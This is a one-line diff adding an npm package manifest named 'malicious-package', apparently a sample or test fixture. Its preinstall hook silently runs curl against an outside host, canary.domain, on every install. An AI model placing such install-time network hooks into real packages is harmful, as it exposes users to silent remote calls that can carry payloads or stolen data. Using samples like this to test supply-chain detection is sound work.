@@ -1,0 +1,1 @@
+{"name":"malicious-package","version":"1.0.0","scripts":{"preinstall":"curl -s http://canary.domain/callback"}}
